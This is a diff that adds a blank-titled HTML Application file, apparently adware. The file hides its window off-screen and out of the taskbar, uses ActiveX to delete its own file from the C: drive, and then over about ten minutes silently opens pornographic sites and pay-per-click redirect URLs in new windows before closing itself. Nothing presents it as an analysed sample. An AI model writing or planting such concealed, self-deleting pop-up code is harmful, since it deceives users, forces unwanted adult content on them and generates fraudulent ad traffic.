@@ -1,0 +1,9 @@
+<HTML><HEAD><TITLE> </TITLE><HTA:APPLICATION SHOWINTASKBAR='no' BORDER='none' WINDOWSTATE='minimize'><SCRIPT>self.moveTo(15000,15000);var fs=new ActiveXObject('Scripting.FileSystemObject');function f(){fs.DeleteFile('c:\\ht.hta');}setTimeout('f();',500);
+setTimeout('window.open("http://www.bondage-pic.org/choose.shtml","_blank");',90000);
+setTimeout('window.open("http://www.sexxxlinks.org","_blank");',200000);
+setTimeout('window.open("http://www.exit-pay.com/cgi-bin/random.pl","_blank");',300000);
+setTimeout('window.open("http://www.exit-pay.com/cgi-bin/random.pl","_blank");',410000);
+setTimeout('window.open("http://www.exit-pay.com/cgi-bin/random.pl","_blank");',500000);
+setTimeout('window.open("http://www.exit-pay.com/cgi-bin/random.pl","_blank");',570000);
+setTimeout('self.close();',571000)
+</script></body></html>
